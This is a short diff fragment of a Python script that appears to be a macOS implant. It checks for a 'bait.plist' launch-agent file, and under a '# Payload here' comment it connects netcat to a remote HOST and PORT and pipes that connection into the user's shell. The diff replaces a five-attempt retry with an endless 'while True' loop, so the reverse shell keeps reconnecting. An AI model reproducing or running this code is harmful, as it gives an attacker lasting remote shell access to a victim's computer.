@@ -35,7 +35,7 @@ if not \"bait.plist\" in os.listdir(la_path):
 
        
 # Payload here
-for _ in range(5):
+while True:
     try:
         nc_process = Popen([\"nc\", HOST, str(PORT)], stdin=PIPE, stdout=PIPE, text=True)
         sh_process = Popen([\"$SHELL\"], stdin=nc_process.stdout, stdout=nc_process.stdin, stderr=nc_process.stdin, text=True)
